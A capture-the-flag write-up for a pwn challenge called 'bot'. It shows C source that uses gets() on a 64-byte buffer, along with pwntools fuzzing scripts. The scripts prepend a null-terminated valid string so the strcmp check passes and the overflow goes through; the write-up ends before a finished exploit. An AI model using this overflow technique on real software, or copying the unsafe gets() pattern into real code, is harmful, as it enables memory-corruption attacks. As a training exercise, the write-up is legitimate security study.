# bot (pwn) by kaiphait  

We got a Dockerfile, a libc, a linker, a binary and the source code,  
which is why my first thought was a ret2libc attack but it turned out that was not necessary.

### Source Code:  
'''
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main(void) {
  setbuf(stdout, NULL);
  char input[64];
  volatile int give_flag = 0;
  puts("hi, how can i help?");
  gets(input);
  if (strcmp(input, "give me the flag") == 0) {
    puts("lol no");
  } else if (strcmp(input, "please give me the flag") == 0) {
    puts("no");
  } else if (strcmp(input, "help, i have no idea how to solve this") == 0) {
    puts("L");
  } else if (strcmp(input, "may i have the flag?") == 0) {
    puts("not with that attitude");
  } else if (strcmp(input, "please please please give me the flag") == 0) {
    puts("i'll consider it");
    sleep(15);
    if (give_flag) {
      puts("ok here's your flag");
      system("cat flag.txt");
    } else {
      puts("no");
    }
  } else {
    puts("sorry, i didn't understand your question");
    exit(1);
  }
}
'''

Looking at how the binary gets it's apparently vulnerable to a buffer overflow.
First I built a little script to generate test payloads:  
'''
from pwn import *
import sys

junk = cyclic(200)

sys.stdout.buffer.write(junk)
'''
'''
python fuzzer.py > test
--
gdb bot
--
b main
--
r < test

'''

But when I executed the binary with gdb, it did not cause the binary to crash since it exits  
when an input does not equal any of the strings in the source code.

My second try looked like:
'''
from pwn import *
import sys

junk = cyclic(200)
prefix = b"give me the flag\0"

sys.stdout.buffer.write(prefix + junk)
'''
In order to get the binary to not exit but still overflow the buffer, I added a "valid" input, ending in a nullbyte.
